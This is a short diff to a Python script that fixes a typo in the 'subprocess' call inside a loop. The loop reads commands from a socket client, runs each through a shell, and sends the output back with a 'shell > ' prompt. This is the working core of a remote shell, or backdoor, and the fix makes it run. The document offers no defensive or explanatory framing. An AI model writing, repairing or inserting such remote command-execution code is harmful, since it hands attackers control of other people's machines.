@@ -10,7 +10,7 @@ try:
    while True:
        comandoBytes=cliente.recv(1024)
        comandoCodificado=comandoBytes.decode("ascii")
-       comando=subrocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+       comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        cliente.send(comando.stdout.read())
        cliente.send("shell > ".encode("ascii"))
              
